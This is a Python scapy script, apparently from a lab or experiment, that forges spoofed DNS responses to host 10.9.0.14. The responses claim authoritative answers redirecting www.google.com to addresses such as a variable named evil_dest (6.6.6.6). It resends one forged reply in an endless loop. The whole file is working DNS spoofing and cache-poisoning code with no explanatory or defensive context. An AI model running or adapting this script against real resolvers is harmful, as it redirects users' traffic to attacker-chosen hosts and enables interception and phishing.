from scapy.all import *
import time

rrname = "www.google.com"
evil_dest = "6.6.6.6"
dst = "10.9.0.14"
src = "1.1.1.1"
rrname = "www.google.com"

google_real_ip = "216.58.198.164"

dns_res = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
    aa=1,
    rd=1,
    qd=DNSQR(qname=rrname),
    qr=1,
    qdcount=1,
    ancount=2,
    an=DNSRR(rrname=rrname, rdata=evil_dest))

def test0():
    pkt = dns_res
    pkt[DNSRR].rdata = "216.58.210.36"
    send(pkt)

def test1():
    pkt1 = dns_res
    pkt1[DNS].ancount=2
    pkt1[DNS].an = DNSRR(rrname=rrname,rdata="1.1.1.1")/DNSRR(rrname=rrname, rdata="216.58.204.36")
    send(pkt1)



#pkt1: 1.1.1.1, 2.2.2.2
#pkt2: 2.2.2.2, 3.3.3.3
def test3():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=rrname,rdata="1.1.1.1")/DNSRR(rrname=rrname, rdata="2.2.2.2")

    pkt2 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt2[DNS].an = DNSRR(rrname=rrname,rdata="2.2.2.2")/DNSRR(rrname=rrname, rdata="3.3.3.3")

    send(pkt1)
    send(pkt2)

#pkt1: 1.1.1.1, 2.2.2.2
#pkt2: 216.58.198.164, 216.58.198.164
def test4():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=rrname,rdata="1.1.1.1")/DNSRR(rrname=rrname, rdata="2.2.2.2")

    pkt2 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt2[DNS].an = DNSRR(rrname=rrname,rdata=google_real_ip)/DNSRR(rrname=rrname, rdata=google_real_ip)

    send(pkt1)
    send(pkt2)

#pkt1: 1.1.1.1, 2.2.2.2
#pkt2: 216.58.198.164, 2.2.2.2
def test5():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=rrname,rdata="1.1.1.1")/DNSRR(rrname=rrname, rdata="2.2.2.2")

    pkt2 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt2[DNS].an = DNSRR(rrname=rrname,rdata=google_real_ip)/DNSRR(rrname=rrname, rdata="2.2.2.2")

    send(pkt1)
    send(pkt2)

#pkt1: 4.4.4.4, 5.5.5.5
def test6():
    pkt1 = IP(src=src, dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
        aa=1,
        rd=1,
        qd=DNSQR(qname=rrname),
        qr=1,
        qdcount=1,
        ancount=2)
    pkt1[DNS].an = DNSRR(rrname=rrname,rdata="4.4.4.4")/DNSRR(rrname=rrname, rdata="5.5.5.5")

    send(pkt1)



#send(dns_res)
while True:
    test1() 
    time.sleep(2)